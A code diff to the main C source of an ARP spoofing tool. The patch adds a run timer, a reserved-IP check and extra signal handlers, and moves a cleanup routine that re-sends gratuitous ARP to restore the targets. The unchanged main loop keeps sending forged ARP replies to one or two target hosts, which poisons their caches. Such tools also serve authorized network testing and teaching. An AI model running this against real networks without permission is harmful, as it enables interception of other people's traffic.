@@ -14,13 +14,13 @@
 #include "arp.h"
 #include "netutil.h"
 #include "parse.h"
+#include "log.h"
 
 #define DELAY_MIN 100
 #define DELAY_MAX 500 
 
-const char * help_msg = "help message\n-g - gratuitous\n -t - target, etc";
-const char * optstring = "hdgsa:b:t:i:m:M:";
-const struct option long_opts[] = {
+static const char * optstring = "hdgsa:b:t:i:m:M:T:";
+static const struct option long_opts[] = {
 	{"help", no_argument, 0, 'h'},
 	{"target-a", required_argument, 0, 'a'},
 	{"target-b", required_argument, 0, 'b'},
@@ -31,76 +31,21 @@ const struct option long_opts[] = {
 	{"rand-min", required_argument, 0, 'm'},
 	{"rand-max", required_argument, 0, 'M'},
 	{"storm", no_argument, 0, 's'},
+	{"timer", required_argument, 0, 'T'},
 	{0, 0, 0, 0}
 };
+
+void cleanup_handler(int sig);
 
 typedef struct {
 	char * interface;
 	char * ip_a;
 	char * ip_b;
-	uint8_t *  mac_src;
 	uint8_t * mac_dst_a;
 	uint8_t * mac_dst_b;
 } cleanup_data_t;
 
-volatile cleanup_data_t cleanup_data = {0};
-
-void cleanup_handler(int sig) {
-	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-	
-	if(fd < 0) {
-		fprintf(stderr, "[X] Error: Unable to create socket: %s\n", strerror(errno));
-		exit(1);
-	}
-
-	char * interface = cleanup_data.interface;
-	char * ip_a = cleanup_data.ip_a;
-	char * ip_b = cleanup_data.ip_b;
-	uint8_t * mac_src = cleanup_data.mac_src;
-	uint8_t * mac_dst_a = cleanup_data.mac_dst_a;
-	uint8_t * mac_dst_b = cleanup_data.mac_dst_b;
-	uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-
-	arp_ctx_t arp_ctx_a = {0};
-	arp_ctx_t arp_ctx_b = {0};
-
-	if(cleanup_data.ip_b) {
-		arp_ctx_a.src_ip = ip_a;
-		arp_ctx_a.dst_ip = ip_a;
-		arp_ctx_b.src_ip = ip_b;
-		arp_ctx_b.dst_ip = ip_b;
-		
-		arp_ctx_a.src_mac = mac_dst_a;
-		arp_ctx_b.src_mac = mac_dst_b;
-
-		arp_ctx_a.dst_mac = broadcast_mac;
-		arp_ctx_b.dst_mac = broadcast_mac;
-	}	
-	else {
-		arp_ctx_a.src_ip = ip_a;
-		arp_ctx_a.dst_ip = ip_a;
-		arp_ctx_a.src_mac = mac_dst_a;
-		arp_ctx_a.dst_mac = broadcast_mac;
-	}
-	
-	for(int i = 0; i < 3; i++) {
-		int reply_a = 0, reply_b = 0;		
-		
-		if(cleanup_data.ip_b)
-			reply_b = arp_reply_from(fd, interface, arp_ctx_b);
-		
-		reply_a = arp_reply_from(fd, interface, arp_ctx_a);
-		
-		if(reply_a != 0 || reply_b != 0) {
-			fprintf(stderr, "ARP send falled while cleanup!\n");
-			exit(1);
-		}
-
-		usleep(333 * 1000);
-	}
-
-	exit(sig);
-}
+static volatile cleanup_data_t cleanup_data = {0};
 
 int main(int argc, char * argv[]) {	
 	bool is_dual_target = 0;
@@ -118,11 +63,9 @@ int main(int argc, char * argv[]) {
 	int fd = 0;	
 	int rand_min = DELAY_MIN;
 	int rand_max = DELAY_MAX;
-
+	int timeout = -1;
 	arp_ctx_t arp_ctx_a = {0};
 	arp_ctx_t arp_ctx_b = {0};
-
-	char if_path[256];
 
 	for (;;) {
 		opt = getopt_long(argc, argv, optstring, long_opts, &opt);
@@ -132,7 +75,7 @@ int main(int argc, char * argv[]) {
 		
 		switch(opt) {
 			case 'h':
-				fprintf(stderr, "%s", help_msg);
+				print_help();
 				exit(0);
 			case 'a':
 				arp_ctx_a.dst_ip = optarg;
@@ -161,6 +104,9 @@ int main(int argc, char * argv[]) {
 			case 's':
 				is_arp_storm = 1;
 				break;
+			case 'T':
+				timeout = atoi(optarg);
+				break;
 			default:
 				break;
 		}
@@ -168,7 +114,10 @@ int main(int argc, char * argv[]) {
 	
 	if(check_targets_ip(arp_ctx_a.dst_ip, arp_ctx_b.dst_ip, is_dual_target))
 		exit(1);
-
+	
+	if(is_reserved_ip(arp_ctx_a.dst_ip) || is_reserved_ip(arp_ctx_b.dst_ip))
+		exit(1);
+	
 	if(check_rand_ranges(rand_min, rand_max))
 		exit(1);
 
@@ -225,7 +174,6 @@ int main(int argc, char * argv[]) {
 	cleanup_data.interface = interface;
 	cleanup_data.ip_a = arp_ctx_a.dst_ip;
 	cleanup_data.ip_b = arp_ctx_b.dst_ip;
-	cleanup_data.mac_src = src_mac;
 	cleanup_data.mac_dst_a = dst_mac_a;
 	cleanup_data.mac_dst_b = dst_mac_b;
 	
@@ -248,13 +196,25 @@ int main(int argc, char * argv[]) {
 		arp_ctx_a.dst_mac = broadcast_mac;
 	}
 
-	signal(SIGINT, cleanup_handler);	
+	signal(SIGINT, cleanup_handler);
+	signal(SIGALRM, cleanup_handler);
+	signal(SIGTERM, cleanup_handler);
+	signal(SIGQUIT, cleanup_handler);
+	signal(SIGHUP, cleanup_handler);
+	signal(SIGTSTP, cleanup_handler);
 	
-	srandom(time(NULL));
+	srandom((unsigned int)time(NULL));
+	
+	if(timeout < 1) {
+		fprintf(stderr, "[!] Timeout is invalid");
+		exit(1);
+	}
+
+	alarm(timeout);
 
 	for(;;) {
-		uint16_t delay_ms = rand_min + random() % (rand_max - rand_min);
-		int reply_a, reply_b;
+		uint16_t delay_ms = rand_min + (uint16_t) random() % (rand_max - rand_min);
+		int reply_a = 0, reply_b = 0;
 		
 		if(is_dual_target) {
 			reply_a = arp_reply(fd, interface, arp_ctx_a);
@@ -273,6 +233,67 @@ int main(int argc, char * argv[]) {
 			usleep(delay_ms * 1000);
 	}
 
-	close(fd);
 	return 0;
-}	
+}
+
+void cleanup_handler(int sig) {
+	if(sig == SIGALRM)
+		fprintf(stderr, "[*] Timer time exceeded\n");
+	else 
+		fprintf(stderr, "[*] Aborted by user\n");
+
+	fprintf(stderr, "[*] Sending gratuitous ARP to re-arping targets\n");
+	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	
+	if(fd < 0) {
+		fprintf(stderr, "[X] Error: Unable to create socket: %s\n", strerror(errno));
+		exit(1);
+	}
+
+	char * interface = cleanup_data.interface;
+	char * ip_a = cleanup_data.ip_a;
+	char * ip_b = cleanup_data.ip_b;
+	uint8_t * mac_dst_a = cleanup_data.mac_dst_a;
+	uint8_t * mac_dst_b = cleanup_data.mac_dst_b;
+	uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+	arp_ctx_t arp_ctx_a = {0};
+	arp_ctx_t arp_ctx_b = {0};
+
+	if(cleanup_data.ip_b) {
+		arp_ctx_a.src_ip = ip_a;
+		arp_ctx_a.dst_ip = ip_a;
+		arp_ctx_b.src_ip = ip_b;
+		arp_ctx_b.dst_ip = ip_b;
+		
+		arp_ctx_a.src_mac = mac_dst_a;
+		arp_ctx_b.src_mac = mac_dst_b;
+
+		arp_ctx_a.dst_mac = broadcast_mac;
+		arp_ctx_b.dst_mac = broadcast_mac;
+	}	
+	else {
+		arp_ctx_a.src_ip = ip_a;
+		arp_ctx_a.dst_ip = ip_a;
+		arp_ctx_a.src_mac = mac_dst_a;
+		arp_ctx_a.dst_mac = broadcast_mac;
+	}
+	
+	for(int i = 0; i < 3; i++) {
+		int reply_a = 0, reply_b = 0;		
+		
+		if(cleanup_data.ip_b)
+			reply_b = arp_reply_from(fd, interface, arp_ctx_b);
+		
+		reply_a = arp_reply_from(fd, interface, arp_ctx_a);
+		
+		if(reply_a != 0 || reply_b != 0) {
+			fprintf(stderr, "ARP send falled while cleanup!\n");
+			exit(1);
+		}
+
+		usleep(333 * 1000);
+	}
+
+	exit(sig);
+}
